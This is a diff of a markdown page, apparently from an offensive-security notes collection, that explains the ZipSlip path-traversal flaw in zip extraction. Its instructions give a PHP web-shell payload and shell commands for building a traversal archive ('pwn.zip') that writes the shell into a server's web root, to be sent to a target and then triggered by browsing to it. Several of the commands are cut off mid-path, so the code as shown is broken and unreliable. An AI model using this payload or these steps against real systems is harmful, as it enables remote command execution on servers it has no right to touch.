@@ -33,27 +33,51 @@ Zip archives can contain references to files by relative path, which can enable 
 
 Zip archives can contain references to files by relative path, which can enable attackers to craft a zip file which extracts files on the target system using those paths, writing  files outside of the current directory. Some software libraries have unintentionally included this feature (coined "ZipSlip"), and it can be exploited to write files anywhere on disk provided sufficient permissions.
 
+
+
 # Instructions
 
 In this example, a PHP Command Shell will be written to: `/var/www/html/shell.php`
 
+
+
 1. Select a payload. Suggested:
+
+
 
 **Code**: [[<?php system($_REQUEST["cmd"]); ?>]]
 
+
+
 2. Set up the directory structure. For this example, the zip file will be created in `/tmp/1/2/3/4,` while the shell will be created in `/tmp/var/www/html`.
+
+
 
 **Code**: [[mkdir -p /tmp/1/2/3/4 && mkdir -p /tmp/var/www/htm]]
 
+
+
 3. Create the payload in the target directory. 
+
+
 
 **Code**: [[echo '<?php system($_REQUEST["cmd"]); ?>' >>  /tmp]]
 
+
+
 4. Create the zip archive, starting from /tmp/1/2/3/4, using the relative path of the payload
+
+
+
+
 
 **Code**: [[cd /tmp/1/2/3/4 && zip pwn.zip ../../../var/www/ht]]
 
+
+
 5. Send the archive to the target. Upon extraction, if the target is vulnerable, the payload will be written in the web server's root directory, and can be triggered by browsing to it.
+
+
 
 It may be necessary to create deeper directories in order to reach the target directory via directory traversal. 
 
@@ -77,3 +101,5 @@ It may be necessary to create deeper directories in order to reach the target di
 ## Tags
 
 - [[known vulnerability]]
+
+
